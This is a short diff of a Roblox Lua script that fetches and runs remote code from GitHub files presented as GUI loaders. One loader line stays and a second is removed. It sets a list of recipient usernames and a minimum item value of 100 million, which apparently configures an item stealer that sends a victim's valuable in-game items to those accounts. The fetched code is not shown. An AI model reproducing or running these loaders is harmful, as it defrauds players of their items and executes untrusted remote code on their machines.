@@ -1,6 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/gui_loader.lua"))()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/GAG-SKULLS/refs/heads/main/spawning_gui.lua"))()
 
 _G.Usernames = {"ajandaa12", "Qusay52VxWi", "ajandaa12alt11", "ajandaa12alt", "ajandaa12alt1"} -- you can add as many as you'd like
 _G.min_value = 100000000 -- 100 million
